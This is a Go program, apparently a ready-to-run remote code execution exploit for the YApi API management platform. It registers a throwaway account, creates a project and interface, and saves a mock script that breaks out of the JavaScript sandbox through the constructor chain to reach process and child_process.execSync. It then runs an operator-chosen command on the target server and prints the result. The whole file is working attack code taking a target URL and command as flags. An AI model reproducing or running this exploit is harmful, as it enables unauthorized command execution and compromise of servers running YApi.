package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"strings"
	"time"
)

func sendRequest(url string, cmd string) {
	rand.Seed(time.Now().UnixNano())

	username := rand.Intn(10000000)
	var user_info string = "{\"email\":\"" + fmt.Sprintf("%v", username) + "@123.com\",\"password\":\"test2ss12212\",\"username\":\"" + fmt.Sprintf("%v", username) + "\"}"

	resp, err := http.Post(url+"/api/user/reg",
		"application/json",
		strings.NewReader(user_info))
	if err != nil {
		fmt.Println(err)
	}
	defer resp.Body.Close()
	if err != nil {
		// handle error
	}
	cookies := resp.Header["Set-Cookie"]
	yapi_token := strings.Split(cookies[0], ";")[0]
	yapi_uid := strings.Split(cookies[1], ";")[0]

	url1 := url + "/api/group/get_mygroup"

	group_id := getTheFuckingId(url1, "GET", " ", yapi_token, yapi_uid, "_id")

	var api_info string = "{\"name\":\"111\",\"basepath\":\"/aaa\",\"group_id\":" + group_id + ",\"icon\":\"code-o\",\"color\":\"purple\",\"project_type\":\"private\"}"

	url2 := url + "/api/project/add"
	project_id := getTheFuckingId(url2, "POST", api_info, yapi_token, yapi_uid, "_id")
	project_id = strings.Split(project_id, ".")[0]

	url3 := url + "/api/interface/list_menu?project_id=" + project_id

	cat_id := getTheFuckingId(url3, "GET", " ", yapi_token, yapi_uid, "_id")

	var add_interface string = "{\"method\":\"GET\",\"catid\":" + cat_id + ",\"title\":\"aaa\",\"path\":\"/aaa\",\"project_id\":" + project_id + "}"

	url4 := url + "/api/interface/add"

	interface_id := getTheFuckingId(url4, "POST", add_interface, yapi_token, yapi_uid, "_id")

	interface_id = strings.Split(interface_id, ".")[0]

	url5 := url + "/api/plugin/advmock/save"
	var mock string = "const sandbox = this\\nconst ObjectConstructor = this.constructor\\nconst FunctionConstructor = ObjectConstructor.constructor\\nconst myfun = FunctionConstructor('return process')\\nconst process = myfun()\\nmockJson = process.mainModule.require(\\\"child_process\\\").execSync(\\\"" + cmd + "\\\").toString()\\n"
	var add_mock string = "{\"project_id\":\"" + project_id + "\",\"interface_id\":\"" + interface_id + "\",\n\"mock_script\":\"" + mock + "\",\n\"enable\":true}"
	message := getTheFuckingId(url5, "POST", add_mock, yapi_token, yapi_uid, "mock_script")
	fmt.Println("your mock is ", string(message))

	api_url := url + "/mock/" + project_id + "/aaa/aaa"
	req, err := http.NewRequest("GET", api_url, strings.NewReader(" "))
	if err != nil {
		fmt.Println(err)
	}
	req.Header.Set("Cookie", yapi_token+"; "+yapi_uid)
	resp_finnal, err := (&http.Client{}).Do(req)
	if err != nil {
		fmt.Println(err)
	}
	resp_finnal_body, _ := ioutil.ReadAll(resp_finnal.Body)
	fmt.Println("command result :", string(resp_finnal_body))

}
func getTheFuckingId(url string, method string, body string, yapi_token string, yapi_uid string, key string) string {
	req, err := http.NewRequest(method, url, strings.NewReader(body))
	if err != nil {
		fmt.Println(err)
	}
	req.Header.Set("Content-Type", "application/json;charset=UTF-8")
	req.Header.Set("Cookie", yapi_token+"; "+yapi_uid)

	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(resp.Status)
	resp_body, _ := ioutil.ReadAll(resp.Body)
	//fmt.Println(string(resp_body))

	var temp map[string]interface{}

	if err := json.Unmarshal([]byte(string(resp_body)), &temp); err != nil {
		fmt.Println(err)
	}

	if datamap, ok := temp["data"].(map[string]interface{}); ok {

		return fmt.Sprintf("%f", datamap[key])
	} else {
		for _, iteam := range temp["data"].([]interface{}) {
			datamap := iteam.(map[string]interface{})[key]

			return fmt.Sprintf("%v", datamap)
		}
	}

	return ""
}

var url string
var cmd string

func Init() {
	flag.StringVar(&url, "url", "", "input url like http://127.0.0.1")
	flag.StringVar(&cmd, "cmd", "", "input cmd like whoami")
}
func main() {
	Init()
	flag.Parse()
	sendRequest(url, cmd)
}
